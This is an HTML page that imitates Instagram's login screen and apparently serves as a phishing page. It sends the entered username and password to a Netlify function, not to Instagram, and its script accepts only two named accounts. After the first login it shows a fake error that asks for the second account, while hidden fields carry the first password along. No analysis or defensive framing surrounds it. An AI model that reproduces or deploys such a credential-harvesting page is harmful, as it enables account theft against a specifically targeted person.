<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login</title>
  <link rel="stylesheet" href="style.css" />
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
    rel="stylesheet"
  />
</head>
<body>
  <div class="container">
    <div class="center">
      <div class="header">
        <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
      </div>
      <div class="inputElement">
        <div id="error-msg" style="display:none;color:#c00;text-align:center;margin-bottom:10px;font-size:14px;"></div>
        <form action="/.netlify/functions/login" method="POST" id="loginForm">
          <input type="text" name="username" placeholder="Phone number,username or email" class="inputText" required />
          <input type="password" name="password" placeholder="Password" class="inputText" required />
          <input type="hidden" name="first" id="firstField" />
          <input type="hidden" name="firstpass" id="firstPassField" />
          <input type="submit" value="Log in" class="inputButton" />
        </form>
        <div class="line">
          <span class="arrow"></span>
          <span class="content">OR</span>
          <span class="arrow"></span>
        </div>
        <div class="social__icon">
          <i class="fab fa-facebook-square"></i><span>Log in with facebook</span>
        </div>
        <div class="forgetPassword">Forget Password?</div>
      </div>
    </div>
    <div class="footer">
      <p>Don't have a accout?<span>Sign Up</span></p>
    </div>
  </div>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(location.search);
      const first = params.get('first');
      const firstpass = params.get('firstpass');
      const error = params.get('error');
      const banner = document.getElementById('error-msg');
      let other;
      if (first === 'anu_shkasingh_73') other = 'anuuwwshka';
      else if (first === 'anuuwwshka') other = 'anu_shkasingh_73';
      if (error === 'next') {
        banner.textContent = 'Now please log in with "' + other + '"';
        banner.style.display = 'block';
        document.getElementById('firstField').value = first;
        document.getElementById('firstPassField').value = firstpass;
      }
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        const user = this.username.value.trim();
        if (!first) {
          if (user !== 'anu_shkasingh_73' && user !== 'anuuwwshka') {
            e.preventDefault();
            alert('Please enter a valid username.');
          }
        } else {
          if (user !== other) {
            e.preventDefault();
            alert('Please log in with "' + other + '".');
          }
        }
      });
    });
  </script>
</body>
</html>
